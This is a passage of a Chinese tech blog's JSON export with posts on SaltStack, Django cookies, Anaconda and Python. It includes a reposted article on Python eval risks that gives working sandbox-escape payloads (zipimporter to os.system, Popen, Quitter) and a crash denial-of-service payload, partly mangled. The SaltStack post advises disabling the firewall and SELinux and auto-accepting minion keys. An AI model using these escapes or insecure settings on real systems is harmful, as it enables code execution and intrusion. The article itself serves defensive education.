yjinjia2、python-msgpack和PyYAML等）构建。 通过部署SaltStack环境，可以在成千上万台服务器上做到批量执行命令，根据不同业务特性进行配置集中化管理、分发文件、采集服务器数据、操作系统基础及软件包管理等，SaltStack是运维人员提高工作效率、规范业务配置与操作的利器。 部署与基本配置我的系统环境： 系统：CentOS-7-x64 yum源:网易163yum源 python：2.7.13 masterIP：192.168.1.107 minionIP：192.168.1.107(我直接在一个虚拟机内安装minion) step 0：安装epel yum源123yum install -y epel-releaseyum clean allyum makecache step 1：安装master和minionmaster 1yum install -y salt-master minion 1yum install -y salt-minion 安装的同时: 1、关闭防火墙 service iptables stop 2、关闭SELinux setenforce 0 step 2：基本配置 注意：下面的配置文件均严格遵循yaml文件格式，冒号后面必须有空格 master vim打开/etc/salt目录下面的mater文件 1、在命令模式下搜索关键词interface，找到下面段落，复制一行在下面打开注释并指定master的主机IP地址 123# The address of the interface to bind to:#interface: 0.0.0.0interface: 192.168.1.107 2、同样，搜索关键词auto_accept，指定是否自动接收minion端，这里设置为true 1234# Enable auto_accept, this setting will automatically accept all incoming# public keys from the minions. Note that this is insecure.#auto_accept: Falseauto_accept: True 3、最后搜索关键词file_root,设置配置文件的根目录，只需打开下面段落的最后三行注释即可 123456789101112131415161718# The file server works on environments passed to the master, each environment# can have multiple root directories, the subdirectories in the multiple file# roots cannot match, otherwise the downloaded files will not be able to be# reliably ensured. A base environment is required to house the top file.# Example:# file_roots:# base:# - /srv/salt/# dev:# - /srv/salt/dev/services# - /srv/salt/dev/states# prod:# - /srv/salt/prod/services# - /srv/salt/prod/states#file_roots: base: - /srv/salt minion vim打开/etc/salt/目录下面的minion文件 1、搜索master:关键词,配置所有连接的服务器IP(没有修改过的话在第16行) 1234# Set the location of the salt master server. If the master server cannot be# resolved, then the minion will fail to start.#master: saltmaster: 192.168.1.107 2、搜索id:关键词，设置minion在master端的名称 1234567# Explicitly declare the id for this minion to use, if left commented the id# will be the hostname as returned by the python call: socket.getfqdn()# Since salt uses detached ids it is possible to run multiple minions on the# same machine but with different ids, this can be useful for salt compute# clusters.#id:id: local-minion step 3：重启master和minion重启master 1systemctl restart salt-master.service 重启以后可以查看一下master服务当前状态,显示active即启动成功 123456789101112131415161718192021[root@localhost vimiix]# systemctl status salt-master.service● salt-master.service - The Salt Master Server Loaded: loaded (/usr/lib/systemd/system/salt-master.service; disabled; vendor preset: disabled) Active: **active** (running) since Tue 2017-06-27 19:19:28 CST; 1min 22s ago Main PID: 49362 (salt-master) CGroup: /system.slice/salt-master.service ├─49362 /usr/bin/python /usr/bin/salt-master ├─49377 /usr/bin/python /usr/bin/salt-master ├─49378 /usr/bin/python /usr/bin/salt-master ├─49379 /usr/bin/python /usr/bin/salt-master ├─49380 /usr/bin/python /usr/bin/salt-master ├─49382 /usr/bin/python /usr/bin/salt-master ├─49383 /usr/bin/python /usr/bin/salt-master ├─49384 /usr/bin/python /usr/bin/salt-master ├─49396 /usr/bin/python /usr/bin/salt-master ├─49399 /usr/bin/python /usr/bin/salt-master └─49400 /usr/bin/python /usr/bin/salt-masterJun 27 19:19:26 localhost.localdomain systemd[1]: Starting The Salt Master Se...Jun 27 19:19:28 localhost.localdomain systemd[1]: Started The Salt Master Ser...Hint: Some lines were ellipsized, use -l to show in full. 重启minion 1systemctl restart salt-minion.service 补充： centOS-7以前的版本重启服务的命令是service restart xxxxxx(服务名) step 4：master同步所有主机可以在同步前，先查看当前salt-key信息 123456[root@localhost vimiix]# salt-key -LAccepted Keys: local-minionDenied Keys:Unaccepted Keys:Rejected Keys: 同步所有主机 1salt-key -A step 5： 测试测试被控主机是否连通 123[root@localhost vimiix]# salt &quot;*&quot; test.pinglocal-minion: True local-minon 就是刚刚我设置的客户端主机在服务器端的名称，连接正确，配置完成。 远程命令测试 123[root@localhost vimiix]# salt &quot;*&quot; cmd.run &quot;uptime&quot; local-minion: 19:51:04 up 4:23, 2 users, load average: 0.08, 0.06, 0.41 SaltStack执行命令的格式和Python API命令格式 salt [argv] object command [argument] 分为以下几个部分： salt saltstack的“发动机” argv 命令参数 object 要执行命令的对象 command 要执行的命令 argument 要执行的命令的参数 argv: -E 指定选择要执行命令的对象时用正则来匹配对象 123[root@localhost vimiix]# salt -E &quot;^local+&quot; test.pinglocal-minion: True -L 指定选择要执行命令的对象时采用列表的方式 1234#我本机只连接了创建了一个主机，下面的‘*’可以替换为每个主机名，以“，”分隔每个主机名[root@localhost vimiix]# salt -L &quot;local-minion,*&quot; test.pinglocal-minion: True command: test.ping 测试客户端是否连通 cmd.run 执行linux命令 12345[root@localhost vimiix]# salt &apos;*&apos; cmd.run &apos;free -m&apos;local-minion: total used free shared buff/cache available Mem: 976 660 102 4 214 106 Swap: 2047 78 1969 python API在部署saltstack的同时本地python会具有一个salt的模块 示例： 12345678#!/usr/bin/python#coding:utf-8import salt.clientclient = salt.client.LocalClient()ret = client.cmd(\"*\",\"test.ping\")print(ret)","categories":[{"name":"DevOps","slug":"DevOps","permalink":"http://blog.vimiix.com/categories/DevOps/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"SaltStack","slug":"SaltStack","permalink":"http://blog.vimiix.com/tags/SaltStack/"},{"name":"DevOps","slug":"DevOps","permalink":"http://blog.vimiix.com/tags/DevOps/"}]},{"title":"Web||关于cookie和session一点知识","slug":"web-cookie-and-session","date":"2017-06-22T08:03:54.000Z","updated":"2017-06-22T09:40:47.497Z","comments":true,"path":"2017/06/22/web-cookie-and-session.html","link":"","permalink":"http://blog.vimiix.com/2017/06/22/web-cookie-and-session.html","excerpt":"cookie(维基百科定义) Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。","text":"cookie(维基百科定义) Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”[1]，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。 cookie机制cookie机制采用的是在客户端保持状态的方案。 cookie机制，就是当服务器对访问它的用户生成了一个session的同时服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie，保存在客户端，里面记录着用户当前的信息，当用户再次访问服务器时，浏览器检查所有存储的cookie，如果某个cookie所声明的作用范围大于等于将要请求的资源所在的位置也就是对应的Cookie文件,若存在，则把该cookie附在请求资源的HTTP请求头上发送给服务器。 cookie的内容主要包括：名字，值，过期时间，路径和域。 前三个内容比较好理解，不作叙述。 路径就是跟在域名后面的URL路径，比如/或者/foo等等，路径与域合在一起就构成了cookie的作用范围。 cookie生命周期如果不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，只要关闭浏览器窗口，cookie就消失了。这种生命期为浏览器会话期的 cookie被称为会话cookie。会话cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。 如果设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览器，这些cookie仍然有效直到超过设定的过期时间。 session(百度百科定义) Session直接翻译成中文比较困难，一般都译成时域。在计算机专业术语中，Session是指一个终端用户与交互系统进行通信的时间间隔，通常指从注册进入系统到注销退出系统之间所经过的时间。以及如果需要的话，可能还有一定的操作空间。 session机制Session机制采用的是在服务器端保持状态的方案。 当用户访问到一个服务器，服务器就要为该用户创建一个SESSION，在创建这个SESSION的时候，服务器首先检查这个用户发来的请求里是否包含了一个SESSIONID，如果包含了一个SESSIONID则说明之前该用户已经登陆过并为此用户创建过SESSION，那服务器就按照这个 SESSIONID把这个SESSION在服务器的内存中查找出来（如果查找不到，就有可能为他新创建一个），如果客户端请求里不包含有 SESSIONID，则为该客户端创建一个SESSION并生成一个与此SESSION相关的SESSIONID。这个SESSIONID是唯一的、不重复的、不容易找到规律的字符串，这个SESSIONID将被在本次响应中返回到客户端保存，而保存这个SESSIONID的正是COOKIE，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。 Request请求流程中的cookie和session Request结束之后的流程 Django中操作cookie和session1234567891011121314#设置cookieresponse.set_cookie(\"cookie_Key\", \"value\", max_age)#获取cookievalue = request.COOKIES[\"cookie_Key\"]#删除cookieresponse.delete_cookie(\"cookie_Key\", path=\"/\", domain=name)#设置sessionrequest.session[\"session_name\"] = \"admin\"#获取sessionsession_name = request.session[\"session_name\"]#删除sessiondel request.session[\"session_name\"] table th:nth-of-type(1) { width: 100px; } table th:nth-of-type(2) { width: 100px; } 设置cookie可传递的可选参数描述：（参考自网络） 参数 缺省值 描述 max_age None cookies的持续有效时间（以秒计），如果设置为 None cookies 在浏览器关闭的时候就失效了 expires None cookies的过期时间，格式： “Wdy, DD-Mth-YY HH:MM:SS GMT” 如果设置这个参数，它将覆盖 max_age 参数。 path “/“ cookie生效的路径前缀，浏览器只会把cookie回传给带有该路径的页面，这样你可以避免将cookie传给站点中的其他的应用。当你的应用不处于站点顶层的时候，这个参数会非常有用。 domain None cookie生效的站点。你可用这个参数来构造一个跨站cookie。如,domain=”.example.com”所构造的cookie对下面这些站点都是可读的： www.example.com 、www2.example.com 和an.other.sub.domain.example.com 。如果该参数设置为 None ，cookie只能由设置它的站点读取。 secure False 如果设置为 True ，浏览器将通过HTTPS来回传cookie。","categories":[{"name":"Web","slug":"Web","permalink":"http://blog.vimiix.com/categories/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"django","slug":"django","permalink":"http://blog.vimiix.com/tags/django/"},{"name":"cookie","slug":"cookie","permalink":"http://blog.vimiix.com/tags/cookie/"},{"name":"session","slug":"session","permalink":"http://blog.vimiix.com/tags/session/"}]},{"title":"Python||使用Anaconda完成Python多环境配置","slug":"Python-Python-multiversion-dev-Anaconda","date":"2017-06-01T01:53:54.000Z","updated":"2017-06-01T04:24:29.222Z","comments":true,"path":"2017/06/01/Python-Python-multiversion-dev-Anaconda.html","link":"","permalink":"http://blog.vimiix.com/2017/06/01/Python-Python-multiversion-dev-Anaconda.html","excerpt":"今天是六月一号，国际儿童节，首先祝生活中的每一个宝宝（只要你觉得自己是宝宝，那你就是）Happy Children’s Day!!! OK,言归正传，昨天开始学习Django开发，个人认为，作为主流趋势，我倾向于用pyhton3.x开发，因为web开发有别与其他，对于实时响应要求相对较高，python3可以更好的优化。在刚刚结束的Pycon2017上，来自Instagram的Lisa Guo和Hui Ding（两位华裔）分别介绍了Instagram为何选择py3以及整个网站迁移py3的过程。虽然还不是很具体了解其中的差别，但一个体量不小的公司做出了向python3迁移的举动，一定说明python3在web开发上有肯定的优势。","text":"今天是六月一号，国际儿童节，首先祝生活中的每一个宝宝（只要你觉得自己是宝宝，那你就是）Happy Children’s Day!!! OK,言归正传，昨天开始学习Django开发，个人认为，作为主流趋势，我倾向于用pyhton3.x开发，因为web开发有别与其他，对于实时响应要求相对较高，python3可以更好的优化。在刚刚结束的Pycon2017上，来自Instagram的Lisa Guo和Hui Ding（两位华裔）分别介绍了Instagram为何选择py3以及整个网站迁移py3的过程。虽然还不是很具体了解其中的差别，但一个体量不小的公司做出了向python3迁移的举动，一定说明python3在web开发上有肯定的优势。 诚然，对于devops来说，使用python2的确是比python3更方便，虽然很多的主流框架还不支持python3，但我觉得，这只是个时间问题。 因为我电脑上装的是python2.7版本，但学习Django,又想用py3,所以就面临了多版本开发的情况。经过一番搜索安装学习，我放弃了virtualenv，选择了用Anaconda，莫名的感觉这个略屌。 windows下用python非常的麻烦。所以想要一个包管理的东西，那么Anaconda是非常好的一个管理工具，无论你是想用python2.7还是python3.4。 这句话是从网上摘的，主要是要强调一点: 对于Anaconda来说，任何模块都看作是一个包，甚至python，甚至anaconda自己。 接下来就开始Anaconda的发现之旅！ #0首先需要下载Anaconda,可以去官网选择你对应的系统版本下载。官网服务器在国外，如果下载速度太慢，清华镜像站也提供了下载地址(https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/)，至于anaconda的版本选择2还是3，网上一致的说法是—-随便，因为他是一个多版本管理工具，后面会创建不同python版本的分支。 #1然后就是安装，下载好以后双击开始安装，基本都直接选择下一步，文件安装路径可以自行选择一下。然后就是等待完成。 #2安装结束以后，打开cmd，输入conda --version查看版本号，如果显示出版本号，证明环境安装成功了。 #3开始创建python多版本环境，这里先理解一个简单的概念，其实一个python环境，就是使用命令调用当前目录下的python编译器。不同的版本，可以理解为在不同文件夹下的不同python版本的编译器。没有创建分支环境时，anaconda有个默认的分支root，这里不是根的意思，这个root指得就是系统环境的python环境。 创建一个除了root分支之外的2.7.×的python环境 12# 创建一个名为python27的环境，指定Python版本是2.7（不用管是2.7.x，conda会为我们自动寻找2.7.x中的最新版本）conda create --name python27 python=2.7 等待自动安装完成，到对应的目录下（[Anaconda的安装目录]\\env)查看，自动生成一个python27的文件夹，就说明安装好了一个python2.7的环境了。 同理，在创建一个python3.4的环境 1conda create --name python34 python=3.4 再看目录，自动生成python34文件夹，那么就成功安装了两个版本的python环境。 查看当前版本分支 1conda info -e 在这里可以看到你所在的python环境分支（分支前面带个*号），以及已安装的所有版本分支。 切换到需要的python版本分支 12345#window系统activate pyhton27#linux,OS X系统source activate python27 window下直接在cmd里输入activate python27就可以切换到python2.7版本的环境下，终端在文件路径前多了一个(python27),就表示切换成功了。 进入以后就是和系统默认隔离的一个python环境，可以在这个环境里面肆意的造了，想装什么包，就装什么包，方法类似pip 123456789#查找beautifulsoup4的包conda search beautifulsoup4#为python34安装beautifulsoup#NOTE: You must tell conda the name of the environment (--name bunnies) OR it will install in the current environment.你必须告诉conda你要安装包的环境的名称，不然会安装在当前环境下。我这里的环境就是python34conda install [--name python34] beautifulsoup4#查看你安装的包conda list 退出当前python分支 12345#windowsdeactivate#linux, OS Xsource deactivate 我的windows系统，在当前环境下，输入deactivate，就退出了。 更多更多conda的指令，需查阅官方手册。","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"Anaconda","slug":"Anaconda","permalink":"http://blog.vimiix.com/tags/Anaconda/"}]},{"title":"[福利]PyCon2017全部演讲视频汇总","slug":"Python-pyCon2017-keynotes","date":"2017-05-25T15:56:55.000Z","updated":"2017-05-25T17:04:15.431Z","comments":true,"path":"2017/05/25/Python-pyCon2017-keynotes.html","link":"","permalink":"http://blog.vimiix.com/2017/05/25/Python-pyCon2017-keynotes.html","excerpt":"PyCon的logo PyCon - Connecting the Python Community 是 Python.org 官方社区从 2002 发起的年度技术大会,旨在勾联全球 Pythonista 共同推进 Python 技术的发展 近日，PyCon 2017正在美国波特兰举行。 时间：从5月17号至5月25日","text":"PyCon的logo PyCon - Connecting the Python Community 是 Python.org 官方社区从 2002 发起的年度技术大会,旨在勾联全球 Pythonista 共同推进 Python 技术的发展 近日，PyCon 2017正在美国波特兰举行。 时间：从5月17号至5月25日 特别鸣谢刘志军老师，在他的公众号Python之禅（id:vttalk）中分享视频福利。 以下是大会演讲视频：（更多大会视频，也可以自行爬梯youtube） Speaker:Paul Everitt, Guido van Rossum Topic:圆桌讨论 Speaker:Yury Selivanov Topic:asyncawait and asyncio in Python 3.6 and beyond Speaker:Riley Doyle Topic:Re Programming the Human Genome with Python Speaker:Raymond Hettinger Topic:Modern Python Dictionaries A confluence of a dozen great ideas Speaker:Victor Stinner Topic:Optimizations which made Python 3.6 faster than Python 3.5 Speaker:Tim Head Topic:Look mum no hands! From blinking LEDs to a bike speedometer with MicroPython Speaker:Sam Agnew Topic:Hacking Classic Nintendo Games with Python Speaker:Sam Kitajima Kimbrel Topic:One Data Pipeline to Rule Them All Speaker:Miguel Grinberg Topic:Asynchronous Python for the Complete Beginner &lt;未完待续…&gt;","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"PyCon2017","slug":"PyCon2017","permalink":"http://blog.vimiix.com/tags/PyCon2017/"}]},{"title":"Python-from __future__ import print_function","slug":"Python-Print-function","date":"2017-05-12T06:55:03.000Z","updated":"2017-05-12T07:25:01.882Z","comments":true,"path":"2017/05/12/Python-Print-function.html","link":"","permalink":"http://blog.vimiix.com/2017/05/12/Python-Print-function.html","excerpt":"Python提供了__future__模块，把下一个新版本的特性导入到当前版本，于是我们就可以在当前版本中测试一些新版本的特性 在python2.x的环境是使用下面语句，则第二句语法检查通过，第三句语法检查失败 123from __future__ import print_functionprint('good') #可以通过执行print 'bad' #语法错误","text":"Python提供了__future__模块，把下一个新版本的特性导入到当前版本，于是我们就可以在当前版本中测试一些新版本的特性 在python2.x的环境是使用下面语句，则第二句语法检查通过，第三句语法检查失败 123from __future__ import print_functionprint('good') #可以通过执行print 'bad' #语法错误 在python2.x中，默认的print只是一个简单的输出流方法，不带有任何的参数。 用下面的两个例子概况： 示例1 123var, var1, var2 = 1, 2, 3print varprint var1, var2 示例1会打印两行，在第二行中两个数字之间会有一个空格。 示例2 12for i in xrange(10): print i, 示例2会将每个数字打印在一行上，每个数字之间有一个空格分割。如果去掉打印时i后面的“,”,每个数字会单独占一行。 下面从__future__众引入对于python2来说比较先进的模块print_function 接口参数： 12print(*values, sep=' ', end='\\n', file=sys.stdout)print(value1, value2, value3, sep=' ', end='\\n', file=sys.stdout) 这里，输出的变量可以是一个序列或者多个变量，可以像上面一样用逗号分开每个变量。 参数sep,end,file是三个可选参数。 sep 指每个输出变量之间的分隔符，默认是一个空格 end 指的是输出结束后的内容，默认是换行 file指的是输出流要输出的目的文件，默认sys.stdout（标准输出） 在Pyhton2 中，print_function 比默认的 print效率要快很多！","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[]},{"title":"Product-一个小爬虫pyCSDNDailySpider","slug":"Product-pyCSDNDailySpider","date":"2017-05-10T16:11:03.000Z","updated":"2017-05-10T16:57:46.500Z","comments":true,"path":"2017/05/11/Product-pyCSDNDailySpider.html","link":"","permalink":"http://blog.vimiix.com/2017/05/11/Product-pyCSDNDailySpider.html","excerpt":"之前写过一篇博客记录了我为了同事把CSDN日报中的每篇推荐的文章链接从每篇网页的源文件中筛选出来的一番折腾。 （Python-SyntaxError:Non-ASCII character ‘\\e8’ in…. ） 当时刚刚开始学习python,代码质量可见一斑。 今天趁着中午休息时间，又用爬虫的思想重新实现了一下这个功能。","text":"之前写过一篇博客记录了我为了同事把CSDN日报中的每篇推荐的文章链接从每篇网页的源文件中筛选出来的一番折腾。 （Python-SyntaxError:Non-ASCII character ‘\\e8’ in…. ） 当时刚刚开始学习python,代码质量可见一斑。 今天趁着中午休息时间，又用爬虫的思想重新实现了一下这个功能。 以下是这个小爬虫的一些基本信息： 项目命名：pyCSDNDailySpider代码托管地址：https://github.com/vimiix/pyCSDNDailySpider٩(๑❛ᴗ❛๑)۶简介: pyCSDNDailySpider是一个小爬虫，用来爬取CSDN网站最近20篇CSDN日报文章链接，爬到的链接会保存在桌面的articleUrls.txt中（若不存在这个文件，会自动生成）。 附： CSDN日报是一个优质技术文章推荐的博客专栏，每天会精选几个领域的优质技术文章各一篇，汇总在每日的日报中推出。旨在帮助读者及时的获取到国内开发者优质的文章，同时也可以扩大创作者的业界影响力。日报专栏地址：http://blog.csdn.net/column/details/14549.html","categories":[{"name":"Product","slug":"Product","permalink":"http://blog.vimiix.com/categories/Product/"}],"tags":[]},{"title":"【转】Python中eval的强大与潜在风险","slug":"Python-How-to-use-eval","date":"2017-05-04T15:57:34.000Z","updated":"2017-05-05T02:43:09.854Z","comments":true,"path":"2017/05/04/Python-How-to-use-eval.html","link":"","permalink":"http://blog.vimiix.com/2017/05/04/Python-How-to-use-eval.html","excerpt":"这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。 原文出处：WooYun - 隐形人真忙","text":"这两天在做项目的过程中，遇到eval这个方法，不是很会用，经过一番搜索学习，特此收藏一篇乌云网深度好文，以备以后回顾。 原文出处：WooYun - 隐形人真忙 0x00 前言 eval是Python用于执行python表达式的一个内置函数，使用eval，可以很方便的将字符串动态执行。比如下列代码： 12345#!python&gt;&gt;&gt; eval(\"1+2\")3&gt;&gt;&gt; eval(\"[x for x in range(10)]\")[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 当内存中的内置模块含有os的话，eval同样可以做到命令执行： 12345#!python&gt;&gt;&gt; import os&gt;&gt;&gt; eval(\"os.system('whoami')\")win-20140812chjadministrator0 当然，eval只能执行Python的表达式类型的代码，不能直接用它进行import操作，但exec可以。如果非要使用eval进行import，则使用import： 123456789101112#!python&gt;&gt;&gt; exec('import os')&gt;&gt;&gt; eval('import os')Traceback (most recent call last): File \"\", line 1, in File \"\", line 1 import os ^SyntaxError: invalid syntax&gt;&gt;&gt; eval(\"__import__('os').system('whoami')\")win-20140812chjadministrator0 在实际的代码中，往往有使用客户端数据带入eval中执行的需求。比如动态模块的引入，举个栗子，一个在线爬虫平台上爬虫可能有多个并且位于不同的模块中，服务器端但往往只需要调用用户在客户端选择的爬虫类型，并通过后端的exec或者eval进行动态调用，后端编码实现非常方便。但如果对用户的请求处理不恰当，就会造成严重的安全漏洞。 0x01 “安全”使用eval 现在提倡最多的就是使用eval的后两个参数来设置函数的白名单： Eval函数的声明为eval(expression[, globals[, locals]]) 其中，第二三个参数分别指定能够在eval中使用的函数等，如果不指定，默认为globals()和locals()函数中 包含的模块和函数。 123456789101112#!python&gt;&gt;&gt; import os&gt;&gt;&gt; 'os' in globals()True&gt;&gt;&gt; eval('os.system('whoami')')win-20140812chjadministrator0&gt;&gt;&gt; eval('os.system('whoami')',&#123;&#125;,&#123;&#125;)Traceback (most recent call last): File \"\", line 1, in File \"\", line 1, in NameError: name 'os' is not defined 如果指定只允许调用abs函数，可以使用下面的写法： 1234567891011#!python&gt;&gt;&gt; eval('abs(-20)',&#123;'abs':abs&#125;,&#123;'abs':abs&#125;)20&gt;&gt;&gt; eval('os.system('whoami')',&#123;'abs':abs&#125;,&#123;'abs':abs&#125;)Traceback (most recent call last): File \"\", line 1, in File \"\", line 1, in NameError: name 'os' is not defined&gt;&gt;&gt; eval('os.system('whoami')')win-20140812chjadministrator0 使用这种方法来防护，确实可以起到一定的作用，但是，这种处理方法可能会被绕过，从而造成其他问题！ 0x02 绕过执行代码1 被绕过的情景如下，小明知道了eval会带来一定的安全风险，所以使用如下的手段去防止eval执行任意代码： 123456789#!pythonenv = &#123;&#125;env[\"locals\"] = Noneenv[\"globals\"] = Noneenv[\"__name__\"] = Noneenv[\"__file__\"] = Noneenv[\"__builtins__\"] = None eval(users_str, env) Python中的builtins是内置模块，用来设置内置函数的模块。比如熟悉的abs，open等内置函数，都是在该模块中以字典的方式存储的，下面两种写法是等价的： 12345#!python&gt;&gt;&gt; __builtins__.abs(-20)20&gt;&gt;&gt; abs(-20)20 我们也可以自定义内置函数，并像使用Python中的内置函数一样使用它们： 123456#!python&gt;&gt;&gt; def hello():... print 'shabi'&gt;&gt;&gt; __builtin__.__dict__['say_hello'] = hello&gt;&gt;&gt; say_hello()shabi 小明将eval函数的作用域中的内置模块设置为None，好像看起来很彻底了，但依然可以被绕过。builtins是builtin的一个引用，在main模块下，两者是等价的： 12345#!python&gt;&gt;&gt; id(__builtins__)3549136&gt;&gt;&gt; id(__builtin__)3549136 根据乌云drops提到的方法，使用如下代码即可： 12#!python[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == \"zipimporter\"][0](\"/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg\").load_module(\"configobj\").os.system(\"uname\") 上面的代码首先利用class和subclasses动态加载了object对象，这是因为eval中无法直接使用object。然后使用object的子类的zipimporter对egg压缩文件中的configobj模块进行导入，并调用其内置模块中的os模块从而实现命令执行，当然，前提是要有configobj的egg文件。 configobj模块很有意思，居然内置了os模块： 123456789101112#!python&gt;&gt;&gt; \"os\" in configobj.__dict__True&gt;&gt;&gt; import urllib&gt;&gt;&gt; \"os\" in urllib.__dict__True&gt;&gt;&gt; import urllib2&gt;&gt;&gt; \"os\" in urllib2.__dict__True&gt;&gt;&gt; configobj.os.system(\"whoami\")win-20140812chjadministrator0 和configobj类似的模块如urllib，urllib2，setuptools等都有os的内置，理论上使用哪个都行。 如果无法下载egg压缩文件，可以下载带有setup.py的文件夹，加入： 12#!pythonfrom setuptools import setup, find_packages 就可以在dist文件夹中找到对应的egg文件。 绕过demo如下： 1234567891011121314#!python&gt;&gt;&gt; env = &#123;&#125;&gt;&gt;&gt; env[\"locals\"] = None&gt;&gt;&gt; env[\"globals\"] = None&gt;&gt;&gt; env[\"__name__\"] = None&gt;&gt;&gt; env[\"__file__\"] = None&gt;&gt;&gt; env[\"__builtins__\"] = None&gt;&gt;&gt; users_str = \"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'zipimporter'][0]('E:/internships/configobj-5.0.5-py2.7.egg').load_module('configobj').os.system('whoami')\"&gt;&gt;&gt; eval(users_str, env)win-20140812chjadministrator0&gt;&gt;&gt; eval(users_str, &#123;&#125;, &#123;&#125;)win-20140812chjadministrator0 0x03 拒绝服务攻击1 object的子类中有很多有趣的东西，执行以下代码查看： 12#!python[x.__name__ for x in ().__class__.__bases__[0].__subclasses__()] 这里我就不输出结果了，如果你执行的话，可以看到很多有趣的模块，比如file，zipimporter，Quitter等。经过测试，file的构造函数是被解释器沙箱隔离的。 简单的，或者直接使object暴露出的子类Quitter进行退出： 12345#!python&gt;&gt;&gt; eval(\"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Quitter'][0](0)()\", &#123;'__builtins__':None&#125;) C:/&gt; 如果运气好，遇到对方程序中导入了os等敏感模块，那么Popen就可以用，并且绕过builins为空的限制，栗子如下： 1234567#!python&gt;&gt;&gt; import subprocess&gt;&gt;&gt; eval(\"[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-n','1','127.0.0.1'])\",&#123;'__builtins__':None&#125;) &gt;&gt;&gt;正在 Ping 127.0.0.1 具有 32 字节的数据:来自 127.0.0.1 的回复: 字节=32 时间&gt;&gt; 事实上，这种情况非常多，比如导入os模块，一般用来处理路径问题。所以说，遇到这种情况，完全可以列举大量的功能函数，来探测目标object的子类中是否含有一些危险的函数可以直接使用。 0x04 拒绝服务攻击2 同样，我们甚至可以绕过builtins为None，造成一次拒绝服务攻击，Payload(来自老外blog)如下： 12#!python&gt;&gt;&gt; eval('(lambda fc=(lambda n: [c 1=\"c\" 2=\"in\" 3=\"().__class__.__bases__[0\" language=\"for\"][/c].__subclasses__() if c.__name__ == n][0]):fc(\"function\")(fc(\"code\")(0,0,0,0,\"KABOOM\",(),(),(),\"\",\"\",0,\"\"),&#123;&#125;)())()', &#123;\"__builtins__\":None&#125;) 运行上面的代码，Python直接crash掉了，造成拒绝服务攻击。 原理是通过嵌套的lambda来构造一片代码段，即code对象。为这个code对象分配空的栈，并给出相应的代码字符串，这里是KABOOM，在空栈上执行代码，会出现crash。构造完成后，调用fc函数即可触发，其思路不可谓不淫荡。 0x05 总结 从上面的内容我们可以看出，单单将内置模块置为空，是不够的，最好的机制是构造白名单，如果觉得比较麻烦，可以使用ast.literal_eval代替不安全的eval。 参考资料： 【1】http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html 【2】http://drops.wooyun.org/web/7490 【3】http://stackoverflow.com/questions/3513292/python-make-eval-safe","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"eval","slug":"eval","permalink":"http://blog.vimiix.com/tags/eval/"}]},{"title":"【随笔】做一个比昨天的自己更优秀的人","slug":"Better-than-yesterday","date":"2017-04-26T02:17:49.000Z","updated":"2017-04-26T03:17:57.046Z","comments":true,"path":"2017/04/26/Better-than-yesterday.html","link":"","permalink":"http://blog.vimiix.com/2017/04/26/Better-than-yesterday.html","excerpt":"","text":"正文 还依稀记得在上学时不止一次的憧憬着自己毕业后着一身西装白领，阔步在高楼林立之间做着一些 change world 的事情每每这个时候，是多么的盼望着赶快领到毕业证然后走上人生巅峰白驹过隙此时的我仿佛还未长大猛一回头毕业后，三个年头的时光已经被我踏平在了来的路上不禁噗嗤一笑心里却涌上一股暗淡的小情绪“真的已经三年了吗”为什么每天上下班依旧带着上下课的影子租的房子不就是换了一个样子的宿舍吗为什么和在上学相比，没有想象中那么大的变化这就是工作的样子吗没有西装白领每天依旧是T恤牛仔裤没有阔步高楼每天穿梭于地铁人海更没有做着 Change world的事情零零碎碎，嘻嘻哈哈是现在每天的生活基调哪里出了问题了吗心里有个声音在若隐若现生活的精致还是粗糙不是生活本身的属性而是自己一分一秒经历出来的你若报之以笑它必还之以歌笑着努力面对每一天再回首，生活就是你想要的样子不惆怅未来，做一个比昨天的自己更优秀的人","categories":[{"name":"随笔","slug":"随笔","permalink":"http://blog.vimiix.com/categories/随笔/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://blog.vimiix.com/tags/随笔/"}]},{"title":"Python操作MySQL数据库","slug":"Python-use-python-to-operate-MySQL","date":"2017-04-20T15:57:34.000Z","updated":"2017-04-21T01:56:59.096Z","comments":true,"path":"2017/04/20/Python-use-python-to-operate-MySQL.html","link":"","permalink":"http://blog.vimiix.com/2017/04/20/Python-use-python-to-operate-MySQL.html","excerpt":"","text":"数据库准备在操作数据库之前，先做一些前提准备 进入数据库 创建一个名字叫做[test]的数据库。 在这个数据库中，创建一张表，暂且称之为[user]， 这张表里面包含两个标签：[name] 和 [password] 给这张表里面插入两个数据 Vimiix,123456 Mike,654321 到这里，就做好了一个为后面测试操作所用的数据库。 